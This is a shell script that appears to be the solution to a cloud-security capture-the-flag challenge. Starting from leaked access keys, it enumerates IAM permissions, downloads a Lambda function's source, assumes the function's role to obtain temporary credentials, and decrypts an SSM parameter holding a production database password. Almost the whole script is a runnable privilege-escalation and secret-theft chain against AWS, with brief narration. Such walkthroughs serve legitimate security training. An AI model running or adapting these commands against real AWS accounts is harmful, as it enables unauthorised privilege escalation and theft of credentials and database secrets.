#!/bin/sh

echo "Copy the access key details to your credentials file, and set the CLI to use them."
mv ~/.aws/credentials ~/.aws/credentials.bak
cat ../publish/access_key.txt > ~/.aws/credentials
export AWS_PROFILE=devopsadmin

echo "Start by working out who we are, and what we have access to."
echo ">> Our current IAM username"
aws sts get-caller-identity
IAMUSER=`aws sts get-caller-identity | jq -r .Arn | cut -f2 -d/`

echo ">> The permissions of this user"
aws iam list-user-policies --user-name ${IAMUSER}
USERPOLICY=`aws iam list-user-policies --user-name ${IAMUSER} | jq -r .PolicyNames[0]`
aws iam get-user-policy --user-name ${IAMUSER} --policy-name ${USERPOLICY}

echo "We know a lambda is involved, let's find it and see what it can do."
echo ">> A list of all lambda functions"
aws lambda list-functions
FUNCTIONNAME=`aws lambda list-functions | jq -r .Functions[0].FunctionName`
FUNCTIONROLEARN=`aws lambda list-functions | jq -r .Functions[0].Role`
FUNCTIONROLE=`echo $FUNCTIONROLEARN | cut -f2 -d/`
echo ">> The role policy used by the function"
aws iam get-role --role-name ${FUNCTIONROLE}

echo "Interesting, we see that our user can assume it!! Let's save that for later. We also saw earlier that our devopsadmin user can use GetFunction - let's get the function source."
echo "We can use GetFunction to get a url to download the source zip."

SOURCEURL=`aws lambda get-function --function-name ${FUNCTIONNAME} | jq -r .Code.Location`
echo ${SOURCEURL}
curl -o yak.zip --url "${SOURCEURL}"

echo ">> Lambda Python Source"
unzip -p yak.zip yakbase.py

echo "This shows us that an ssm param called "/production/database/password" is being used to hold a DB secret. Let's look at it."
aws ssm get-parameter --name "/production/database/password"

echo "No access. Hmm. But, remember we can assume the role the lambda uses - the lambda MUST be able to access it to work, after all!"
echo ">> Temporary credentials for the lambda role"
aws sts assume-role --role-arn "${FUNCTIONROLEARN}" \
    --role-session-name lambda-access > creds.tmp
cat creds.tmp

echo "copying the AccessKeyId, SecretAccessKey and SessionToken to our credentials file (ref: https://docs.aws.amazon.com/cli/v1/userguide/cli-configure-files.html)"

KEYID=`cat creds.tmp | jq -r .Credentials.AccessKeyId`
SECRET=`cat creds.tmp | jq -r .Credentials.SecretAccessKey`
TOKEN=`cat creds.tmp | jq -r .Credentials.SessionToken`

echo "[temp]" >> ~/.aws/credentials
echo "aws_access_key_id=${KEYID}" >> ~/.aws/credentials
echo "aws_secret_access_key=${SECRET}" >> ~/.aws/credentials
echo "aws_session_token=${TOKEN}" >> ~/.aws/credentials
echo "region=us-east-1" >> ~/.aws/credentials

export AWS_PROFILE=temp

echo "we can now get the param:"
aws ssm get-parameter --name "/production/database/password"

echo "Looks encrypted. What if we include the decrypt flag?" 
echo ">> The decrypted SSM Parameter"
aws ssm get-parameter --name "/production/database/password" --with-decryption

FLAG=`aws ssm get-parameter --name "/production/database/password" --with-decryption | jq .Parameter.Value`
echo $FLAG

echo "There's our flag."

rm yak.zip creds.tmp
mv ~/.aws/credentials.bak ~/.aws/credentials